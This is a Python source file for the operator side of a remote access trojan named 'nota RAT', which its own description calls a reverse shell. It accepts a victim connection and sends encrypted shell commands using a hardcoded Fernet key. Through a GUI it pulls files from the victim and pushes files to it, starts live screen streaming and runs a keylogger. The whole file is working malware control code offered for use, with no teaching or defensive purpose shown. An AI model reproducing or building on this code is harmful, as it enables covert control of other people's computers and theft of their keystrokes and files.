from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk  
from vidstream import StreamingServer
import socket, argparse, time, sys, tkinter, customtkinter, os, threading


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)


args = parser.parse_args()
HOST = '0.0.0.0'
PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
s = socket.socket()

s.bind((HOST, PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
client_socket, client_address = s.accept()
info_connection = f"{client_address[0]}:{client_address[1]} Connected!"

cwds = client_socket.recv(BUFFER_SIZE)
cwds = Fernet(key).decrypt(cwds).decode()


def send(event=None):
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"
    key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
    
    
    while True:
        command = my_msg.get()
        if not command.strip():
            continue
        if command == "exit" or command == "quit" or command == "q":
            commands = "exit"
            commands = Fernet(key).encrypt(commands.encode())
            client_socket.send(commands)
            client_socket.close()
            s.close()
            sys.exit()
        commandz = Fernet(key).encrypt(command.encode())
        client_socket.send(commandz)
        output = client_socket.recv(BUFFER_SIZE)
        output = Fernet(key).decrypt(output).decode()
        results, cwd = output.split(SEPARATOR)
        if command == "clear":
            msg_list.delete(0, tkinter.END)
            msg_list.insert(tkinter.END, f"\n{cwd} $> ")
            my_msg.set("")
            break
        msg_list.insert(tkinter.END, f"")
        msg_list.insert(tkinter.END, f"\n{cwd} $> {command}")
        msg_list.insert(tkinter.END, f"{results}")
        my_msg.set("")
        break


def getfile_command():
    commandz = Fernet(key).encrypt('/getfile'.encode())
    client_socket.send(commandz)
    filenames = my_msg_getfile.get()
    filename = Fernet(key).encrypt(filenames.encode())
    client_socket.send(filename)
    remaining = int.from_bytes(client_socket.recv(4),'big')
    f = open(f"{filenames}","wb")
    while remaining:
        data = client_socket.recv(min(remaining,4096))
        remaining -= len(data)
        f.write(data)
    f.close()
    my_msg_getfile.set("")

def sendfile_command():
    while True:
        commandz = Fernet(key).encrypt('/sendfile'.encode())
        client_socket.send(commandz)
        filenames = my_msg_sendfile.get()
        if filenames not in os.listdir():
            my_msg_sendfile.set("Cannot find file in current working directory")
            break
        filename = Fernet(key).encrypt(filenames.encode())
        client_socket.send(filename)
        with open(f"{filenames}", "rb") as f:
            data = f.read()
            dataLen = len(data)
            client_socket.send(dataLen.to_bytes(4,'big'))
            client_socket.send(data)
        f.close()
        my_msg_sendfile.set("")
        break


receiver = StreamingServer('192.168.3.76', 423)


def getlive():
    commandz = Fernet(key).encrypt('/getlive'.encode())
    client_socket.send(commandz)
    t = threading.Thread(target=receiver.start_server)
    t.start()

def stop_getlive():
    commandz = Fernet(key).encrypt('/stop_getlive'.encode())
    client_socket.send(commandz)
    receiver.stop_server()

def change_appearance_mode(new_appearance_mode):
    customtkinter.set_appearance_mode(new_appearance_mode)


def on_closing(event=None):
    commandz = Fernet(key).encrypt('exit'.encode())
    client_socket.send(commandz)
    sys.exit()
    
def on_closing_logger(event=None):
    commandz = Fernet(key).encrypt('stop keylogger'.encode())
    client_socket.send(commandz)
    runningzz = False
    top.destroy()
    
    
def keylogger_loop():
    global runningzz
    global top
    runningzz = True
    top = Toplevel(app)
    top.geometry("800x600")
    top.protocol("WM_DELETE_WINDOW", on_closing_logger)
    scrollbar_logger = tkinter.Scrollbar(top, bg='#0f0f0f')
    msg_list_logger = tkinter.Listbox(top, height=10, width=110, yscrollcommand=scrollbar_logger.set, bg="grey38",fg='white', font=("Roboto Medium", 12))
    scrollbar_logger.pack(side=tkinter.RIGHT, fill=tkinter.Y)
    msg_list_logger.pack(side=tkinter.LEFT, fill=tkinter.BOTH)
    msg_list_logger.pack()
    LOGGER_HOST = "0.0.0.0"
    LOGGER_PORT = 422
    l = socket.socket()
    l.bind((LOGGER_HOST, LOGGER_PORT))
    l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    l.listen(5)
    commandz = Fernet(key).encrypt('start keylogger'.encode())
    client_socket.send(commandz)
    logger_socket, logger_address = l.accept()
    def keylogger():
        while runningzz:
            msg = logger_socket.recv(BUFFER_SIZE).decode()
            msg_list_logger.insert(tkinter.END, f"{msg}")
    loggerz = threading.Thread(target=keylogger)
    loggerz.daemon = True
    loggerz.start()


def stop_keylogger():
    commandz = Fernet(key).encrypt('stop keylogger'.encode())
    client_socket.send(commandz)
    runningzz = False
    top.destroy()



customtkinter.set_appearance_mode("System")
customtkinter.set_default_color_theme("blue")

app = customtkinter.CTk()
app.geometry("1240x700")
app.title("nota RAT")
app.grid_columnconfigure(1, weight=1)
app.grid_rowconfigure(0, weight=1)


app.frame_left = customtkinter.CTkFrame(master=app, width=180, corner_radius=10)
app.frame_left.grid(row=0, column=0, sticky="nswe", padx=20, pady=20)

app.frame_right = customtkinter.CTkFrame(master=app, width=180, corner_radius=10)
app.frame_right.grid(row=0, column=1, padx=20, pady=20, sticky="nswe")


app.frame_left.grid_rowconfigure(0, minsize=10) 
app.frame_left.grid_rowconfigure(5, weight=1)
app.frame_left.grid_rowconfigure(8, minsize=20)
app.frame_left.grid_rowconfigure(11, minsize=10)

app.frame_right.rowconfigure((0, 1, 2, 3), weight=1)
app.frame_right.rowconfigure(7, weight=10)
app.frame_right.columnconfigure((0, 1), weight=1)
app.frame_right.columnconfigure(2, weight=0)


app.label_2 = customtkinter.CTkLabel(master=app.frame_left, text='nota RAT', text_font=("Roboto Medium", 22))
app.label_2.grid(row=1, column=0, pady=10, padx=20)

label_3 = customtkinter.CTkLabel(master=app.frame_right, text=info_connection, text_font=("Roboto Medium", 18))
label_3.pack(pady=12, padx=12)

messages_frame = tkinter.Frame(app.frame_right)
my_msg = tkinter.StringVar()
scrollbar = tkinter.Scrollbar(messages_frame, bg='#0f0f0f')
msg_list = tkinter.Listbox(messages_frame, height=10, width=110, yscrollcommand=scrollbar.set, bg="grey38",fg='white', font=("Roboto Medium", 12))
scrollbar.pack(side=tkinter.RIGHT, fill=tkinter.Y)
msg_list.pack(side=tkinter.LEFT, fill=tkinter.BOTH)
msg_list.pack()
messages_frame.pack(pady=15, padx=40, fill="both", expand=True)

entry_field = customtkinter.CTkEntry(master=app.frame_right, placeholder_text="command", text_font=("Roboto Medium", 12), width=500, height=25, textvariable=my_msg)
entry_field.bind("<Return>", send)
entry_field.pack(pady=20, padx=60)
send_button = customtkinter.CTkButton(master=app.frame_right, text="Send", command=send, relief='groove', text_font=("Roboto Medium", 11))
send_button.pack(pady=20, padx=60)


app.label_mode = customtkinter.CTkLabel(master=app.frame_left, text="Appearance Mode:", text_font=("Roboto Medium", 10))
app.label_mode.grid(row=13, column=0, pady=0, padx=20, sticky="w")


app.optionmenu_1 = customtkinter.CTkOptionMenu(master=app.frame_left, values=["System", "Light", "Dark"], command=change_appearance_mode, text_font=("Roboto Medium", 10))
app.optionmenu_1.grid(row=14, column=0, pady=15, padx=20, sticky="w")


my_msg_sendfile = tkinter.StringVar()
entry_field_sendfile = customtkinter.CTkEntry(master=app.frame_left, placeholder_text="command", text_font=("Roboto Medium", 12), width=130, height=25, textvariable=my_msg_sendfile)
entry_field_sendfile.bind("<Return>", send)
entry_field_sendfile.grid(row=2, column=0, pady=10, padx=20)
send_button_sendfile = customtkinter.CTkButton(master=app.frame_left, text="send file", command=sendfile_command, relief='groove', text_font=("Roboto Medium", 11))
send_button_sendfile.grid(row=3, column=0, pady=10, padx=20)


my_msg_getfile = tkinter.StringVar()
entry_field_getfile = customtkinter.CTkEntry(master=app.frame_left, placeholder_text="command", text_font=("Roboto Medium", 12), width=130, height=25, textvariable=my_msg_getfile)
entry_field_getfile.bind("<Return>", send)
entry_field_getfile.grid(row=4, column=0, pady=10, padx=20)
send_button_getfile = customtkinter.CTkButton(master=app.frame_left, text="get file", command=getfile_command, relief='groove', text_font=("Roboto Medium", 11))
send_button_getfile.grid(row=5, column=0, pady=10, padx=20)


getrecording_button = customtkinter.CTkButton(master=app.frame_left, text="get live recording", command=getlive, relief='groove', text_font=("Roboto Medium", 12))
getrecording_button.grid(row=6, column=0, pady=10, padx=20)

stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="stop live recording", command=stop_getlive, relief='groove', text_font=("Roboto Medium", 12))
stop_recording_button.grid(row=7, column=0, pady=10, padx=20)

start_logger_button = customtkinter.CTkButton(master=app.frame_left, text="start keylogger", command=keylogger_loop, relief='groove', text_font=("Roboto Medium", 12))
start_logger_button.grid(row=8, column=0, pady=10, padx=20)

stop_logger_button = customtkinter.CTkButton(master=app.frame_left, text="stop keylogger", command=stop_keylogger, relief='groove', text_font=("Roboto Medium", 12))
stop_logger_button.grid(row=9, column=0, pady=10, padx=20)

stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
stop_recording_button.grid(row=10, column=0, pady=10, padx=20)

stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
stop_recording_button.grid(row=11, column=0, pady=10, padx=20)

stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
stop_recording_button.grid(row=12, column=0, pady=10, padx=20)


app.protocol("WM_DELETE_WINDOW", on_closing)

msg_list.insert(tkinter.END, f"\n{cwds} $> ")

app.mainloop()